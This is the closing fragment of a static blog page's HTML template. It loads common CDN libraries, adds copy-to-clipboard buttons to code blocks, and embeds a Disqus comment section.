  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'squarepants0';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
